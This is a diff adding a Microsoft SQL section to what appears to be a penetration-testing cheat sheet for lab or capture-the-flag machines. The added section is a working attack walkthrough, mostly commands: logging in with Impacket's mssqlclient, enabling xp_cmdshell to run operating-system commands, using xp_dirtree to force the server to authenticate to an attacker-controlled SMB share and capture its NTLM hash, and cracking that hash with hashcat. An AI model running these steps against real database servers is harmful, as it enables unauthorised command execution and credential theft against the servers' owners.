@@ -359,7 +359,28 @@ Check version, several privilege escalation vectors.
 
 Microsoft SQL
 
-Connect with default service account
+Impacket has the best MsSQL client I've found, can do both Windows auth and standard. It has additional shell commands to attempt to enable an xp cmdshell and execute commands with it.
+```
+mssqlclient.py username:PcwTWTHRwryjc\$c6@10.10.10.125 -windows-auth
+SQL> enable_xp_cmdshell
+SQL> xp_cmdshell whoami
+```
+If we can connect to a MsSQL server and it has permissions to execute XP_DIRTREE then we can direct it to a smb server we control and capture its hash.
+1. Set up smb server
+```
+smbserver.py -smb2support test smb/
+```
+2. From the SQL shell try access our server
+```
+SQL> EXEC master.sys.xp_dirtree '\\10.10.10.10\test',1,1    
+```
+3. The hash will appear in smbserver, save it and crack it with hashcat
+```
+hashcat -m 5600 mssql-svc.txt /usr/share/wordlists/rockyou.txt  --force
+```
+4. We can use these creds to potentially re-authenticate on the MsSQL shell with higher permissions or maybe connect directly to the machine with smbexec etc.
+
+Alternative to impacket
 ```
 sqsh -S 192.168.1.101 -U sa
 ```
